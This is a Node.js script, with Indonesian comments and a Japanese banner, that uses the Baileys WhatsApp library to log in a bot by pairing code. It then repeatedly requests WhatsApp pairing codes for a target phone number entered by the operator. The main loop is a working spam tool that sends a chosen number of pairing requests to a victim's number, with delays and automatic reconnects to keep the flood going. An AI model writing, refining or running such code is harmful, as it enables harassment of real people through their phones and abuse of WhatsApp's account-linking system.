const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");

// Bagian ini (color, wColor, xColor) tidak berubah
const color = ['\x1b[31m', '\x1b[32m', '\x1b[33m', '\x1b[34m', '\x1b[35m', '\x1b[36m'];
const wColor = color[Math.floor(Math.random() * color.length)];
const xColor = '\x1b[0m';

// Fungsi question (tidak berubah)
const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => rl.question(text, (ans) => { rl.close(); resolve(ans); }));
};

// Fungsi normalizePhoneNumber (tidak berubah)
function normalizePhoneNumber(input) {
    let num = input.replace(/[^\d]/g, '');
    if (num.startsWith('0')) num = '62' + num.slice(1);
    if (num.startsWith('+62')) num = '62' + num.slice(3);
    return num;
}

// Fungsi delay (tidak berubah)
const delay = (ms) => new Promise(res => setTimeout(res, ms));

// Fungsi loadingSpinner (tidak berubah)
async function loadingSpinner(text, duration = 2000, interval = 100) {
    const frames = ['⠸', '⠴', '⠦', '⠧'];
    let i = 0;
    const start = Date.now();
    while (Date.now() - start < duration) {
        process.stdout.write(`\r${text} ${frames[i % frames.length]} `);
        await delay(interval);
        i++;
    }
    process.stdout.write('\r' + ' '.repeat(50) + '\r');
}


// ==================================================
// === FUNGSI connectWhatsApp YANG DIPERBARUI ===
// ==================================================
async function connectWhatsApp() {
    let retryCount = 0;
    const maxRetries = 5;
    const retryDelay = 5000;
    
    // Loop ini untuk percobaan koneksi awal
    while (retryCount < maxRetries) {
        try {
            // FIX 1: Dapatkan 'saveCreds' dari useMultiFileAuthState
            const { state, saveCreds } = await useMultiFileAuthState('./LUCIFER/session');
            
            const LuciferBot = makeWASocket({
                logger: pino({ level: "silent" }),
                printQRInTerminal: false, // Benar, kita pakai pairing code
                auth: state,
                connectTimeoutMs: 60000,
                defaultQueryTimeoutMs: 0,
                keepAliveIntervalMs: 10000,
                emitOwnEvents: true,
                fireInitQueries: true,
                generateHighQualityLinkPreview: true,
                syncFullHistory: true,
                markOnlineOnConnect: true,
                browser: ["Ubuntu", "Chrome", "20.0.04"],
            });
            
            // FIX 2: Daftarkan 'saveCreds' untuk menyimpan sesi
            LuciferBot.ev.on('creds.update', saveCreds);

            // FIX 3: Tambahkan Logika Pairing jika Bot Belum Terdaftar
            if (!LuciferBot.authState.creds.registered) {
                console.log(wColor + 'Bot Anda belum terdaftar (atau sesi terhapus).' + xColor);
                await delay(1000);
                console.log(wColor + 'Silakan masukkan nomor HP yang ingin Anda jadikan BOT (Contoh: 62812...):' + xColor);
                
                let botNumber = await question(wColor + 'Nomor Bot Anda: ' + xColor);
                botNumber = normalizePhoneNumber(botNumber);
                
                if (!botNumber.startsWith('62')) {
                    console.log('❌ Harap gunakan nomor Indonesia (awalan 62) untuk bot Anda.');
                    throw new Error('Nomor bot tidak valid'); // Ini akan memicu retry
                }
                
                console.log(wColor + 'Meminta kode pairing untuk ' + botNumber + '...' + xColor);
                await delay(2000); // Beri waktu user untuk membaca
                
                try {
                    const code = await LuciferBot.requestPairingCode(botNumber);
                    console.log(wColor + '========================================' + xColor);
                    console.log(wColor + 'KODE PAIRING ANDA: ' + code.match(/.{1,4}/g).join('-') + xColor);
                    console.log(wColor + '========================================' + xColor);
                    console.log(wColor + 'Silakan masukkan kode ini di HP Anda:' + xColor);
                    console.log(wColor + '1. Buka WhatsApp di HP Anda' + xColor);
                    console.log(wColor + '2. Buka Menu (titik tiga) > Perangkat tertaut' + xColor);
                    console.log(wColor + '3. Klik "Tautkan perangkat"' + xColor);
                    console.log(wColor + '4. Klik "Tautkan dengan nomor telepon saja"' + xColor);
                    console.log(wColor + '5. Masukkan kode di atas.' + xColor);
                    console.log(wColor + 'Menunggu Anda melakukan pairing...' + xColor);
                } catch (pairError) {
                    console.error(wColor + 'Gagal meminta kode pairing:', pairError.message + xColor);
                    throw pairError; // Memicu retry
                }
            }
            
            // FIX 4: Modifikasi handler 'connection.update' agar tidak rekursif
            // dan tunggu koneksi 'open' sebelum melanjutkan
            await new Promise((resolve, reject) => {
                const eventListener = (update) => {
                    const { connection, lastDisconnect } = update;
                    if (connection === 'open') {
                        // Koneksi berhasil
                        LuciferBot.ev.off('connection.update', eventListener); // Hapus listener
                        resolve(true); // Sukses, lanjutkan
                    } else if (connection === 'close') {
                        // Koneksi gagal
                        LuciferBot.ev.off('connection.update', eventListener); // Hapus listener
                        const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
                        
                        if (shouldReconnect) {
                            // Biarkan loop 'while' di 'connectWhatsApp' yang menangani ini
                            reject(lastDisconnect?.error || new Error('Koneksi ditutup.'));
                        } else {
                            console.log(wColor + '\nPerangkat keluar. Hapus folder "LUCIFER/session" dan mulai ulang.' + xColor);
                            process.exit(0); // Keluar jika di-logout
                        }
                    }
                };
                
                // Batas waktu jika user tidak memasukkan kode pairing
                const timeout = setTimeout(() => {
                    LuciferBot.ev.off('connection.update', eventListener);
                    reject(new Error('Waktu tunggu koneksi habis (90 detik). Anda mungkin terlalu lama memasukkan kode pairing.'));
                }, 90000); // 90 detik

                LuciferBot.ev.on('connection.update', eventListener);
            });
            
            // Jika kita sampai di sini, koneksi sudah 'open'
            console.log(wColor + '\nBerhasil terhubung ke WhatsApp!' + xColor);
            if (LuciferBot.user) {
                console.log(wColor + 'Login sebagai:', LuciferBot.user.name || LuciferBot.user.verifiedName || LuciferBot.user.id, xColor);
            }
            
            retryCount = 0; // Reset hitungan retry
            return LuciferBot; // Kembalikan bot yang sudah terhubung

        } catch (error) {
            retryCount++;
            console.error(wColor + `Koneksi gagal (percobaan ${retryCount}/${maxRetries}):`, error.message + xColor);
            if (retryCount >= maxRetries) {
                // Biarkan loop berakhir dan lempar error di luar
            } else {
                await delay(retryDelay); // Tunggu sebelum mencoba lagi
            }
        }
    }
    
    // Jika loop 'while' gagal setelah maxRetries
    throw new Error('Gagal terhubung setelah beberapa kali percobaan');
}
// ==================================================
// === AKHIR FUNGSI connectWhatsApp ===
// ==================================================


// Fungsi LuciferXSatanic (tidak ada perubahan signifikan di sini)
async function LuciferXSatanic() {
    try {
        // TAHAP 1: Tunggu bot berhasil login dulu
        let LuciferBot = await connectWhatsApp();
        
        // Handler ini untuk jika koneksi putus NANTI SAAT SPAM BERJALAN
        const handleReconnect = async () => {
            console.log(wColor + '\nMenyambung ulang...' + xColor);
            try {
                LuciferBot = await connectWhatsApp();
                return true;
            } catch (error) {
                console.error('Koneksi ulang gagal:', error.message);
                return false;
            }
        };
        
        // TAHAP 2: Setelah bot login, baru masuk ke menu utama
        while (true) {
            console.clear();
            console.log(wColor + `
 • スパムペアリングツール
 • 作成者: Hazel
 • 使用注意
┏❐
┃ [ 以下の指示に従ってください ]
┃
┃⭔ Masukkan Nomor | Jumlah (Contoh: 62xxx | 20)
┃⭔ Ketik "exit" kapan saja untuk keluar
┗❐
` + xColor);

            try {
                let userInput = await question(wColor + 'Masukkan Nomor | Jumlah (Contoh: 628123 | 20) : ' + xColor);
                
                if (userInput.toLowerCase() === 'exit') {
                    console.log('Keluar...');
                    process.exit(0);
                }

                const parts = userInput.split('|');
                if (parts.length !== 2) {
                    console.log('❌ Format salah. Harap gunakan format: NOMOR | JUMLAH');
                    await delay(2000);
                    continue; 
                }

                let rawNumber = parts[0].trim();
                let rawCount = parts[1].trim(); 

                let phoneNumber = normalizePhoneNumber(rawNumber);
                if (!phoneNumber.startsWith('62')) {
                    console.log('❌ Harap gunakan nomor Indonesia (awalan 62).');
                    await delay(2000);
                    continue;
                }

                const LuciferCodes = parseInt(rawCount);
                if (isNaN(LuciferCodes) || LuciferCodes <= 0) {
                    console.log('❌ Jumlah spam tidak valid. Contoh: 20');
                    await delay(2000);
                    continue;
                }

                // Logika pengiriman spam (dari kode asli, tidak berubah)
                for (let i = 0; i < LuciferCodes; i++) {
                    try {
                        await loadingSpinner(`Sending package to ${phoneNumber}`, 2000, 200);
                        let code = await LuciferBot.requestPairingCode(phoneNumber);
                        code = code?.match(/.{1,4}/g)?.join("-") || code;
                        console.log(wColor + `スパム成功 ✅ 番号 : ${phoneNumber} [${i + 1}/${LuciferCodes}] | Kode: ${code}` + xColor);
                    } catch (error) {
                        console.error('エラー (Gagal mengirim spam):', error.message);
                        // Jika error terjadi (misal koneksi putus), panggil handleReconnect
                        const reconnected = await handleReconnect();
                        if (!reconnected) {
                             console.log('Gagal menyambung ulang, menghentikan spam...');
                            break; // Keluar dari loop for
                        }
                        // Jika berhasil, ulangi iterasi yang gagal
                        i--; 
                        console.log('Menyambung ulang berhasil, mencoba lagi...');
                        await delay(3000); // Beri jeda setelah reconnect
                    }
                    await delay(5000); // Jeda antar pengiriman
                }

                if (LuciferCodes > 0) {
                     console.log('\nSelesai! Menunggu input baru...');
                }
                await delay(3000);

            } catch (error) {
                console.error('エラーが発生しました (Loop utama error):', error.message);
                const reconnected = await handleReconnect();
                if (!reconnected) break; // Keluar dari loop while(true) jika reconnect gagal
                await delay(3000);
            }
        }
    } catch (error) {
        console.error('Fatal error (Gagal koneksi awal):', error.message);
        process.exit(1);
    }
}

LuciferXSatanic();
